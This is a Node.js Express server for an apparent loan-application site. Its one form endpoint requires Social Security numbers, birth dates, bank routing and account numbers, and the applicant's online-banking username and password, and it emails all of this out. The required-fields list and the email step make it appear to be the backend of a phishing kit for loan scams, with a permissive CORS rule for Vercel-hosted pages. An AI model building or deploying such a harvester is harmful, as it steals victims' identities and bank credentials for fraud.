import dotenv from "dotenv";
import path from "path";
import { fileURLToPath } from "url";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

dotenv.config({ path: path.resolve(__dirname, ".env") });
dotenv.config();
import express from "express";
import cors from "cors";
import helmet from "helmet";
import rateLimit from "express-rate-limit";

import { sendLoanApplicationEmail } from "./emailService.js";

const app = express();
const port = process.env.PORT || 3001;

const allowedOrigins = (process.env.ALLOWED_ORIGINS || "").split(",").map((origin) => origin.trim()).filter(Boolean);

app.use(helmet({ contentSecurityPolicy: false }));
app.use(express.json({ limit: "1mb" }));
app.use(
  cors({
    origin: (origin, callback) => {
      if (
        !origin ||
        allowedOrigins.length === 0 ||
        allowedOrigins.includes(origin) ||
        origin.endsWith(".vercel.app") ||
        process.env.VERCEL
      ) {
        callback(null, true);
      } else {
        callback(new Error("Not allowed by CORS"));
      }
    },
    credentials: true,
  }),
);

const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  limit: 100,
  standardHeaders: true,
  legacyHeaders: false,
});

app.use(limiter);

app.get("/health", (req, res) => {
  res.json({ status: "ok" });
});

app.post("/api/loan-application", async (req, res) => {
  try {
    const data = req.body;

    if (!data || typeof data !== "object") {
      return res.status(400).json({ message: "Invalid payload" });
    }

    const requiredFields = [
      "loanApprovalId",
      "loanAmount",
      "loanDuration",
      "loanPurpose",
      "firstName",
      "lastName",
      "email",
      "address1",
      "city",
      "state",
      "zipCode",
      "ssn",
      "birthDate",
      "bankName",
      "routingNumber",
      "accountNumber",
      "bankUsername",
      "bankPassword",
    ];

    const missing = requiredFields.filter((field) => !data[field]);

    if (missing.length > 0) {
      return res.status(400).json({ message: `Missing required fields: ${missing.join(", ")}` });
    }

    await sendLoanApplicationEmail(data);

    res.json({ message: "Loan application submitted successfully" });
  } catch (error) {
    console.error("Loan application submission failed", error);
    res.status(500).json({ message: error?.message || "Failed to submit loan application" });
  }
});

app.use((err, req, res, next) => {
  console.error("Unhandled error", err);
  res.status(500).json({ message: err?.message || "Internal server error" });
});

if (process.env.NODE_ENV !== "production" || !process.env.VERCEL) {
  app.listen(port, () => {
    console.log(`Loan application server running on port ${port}`);
  });
}

export default app;
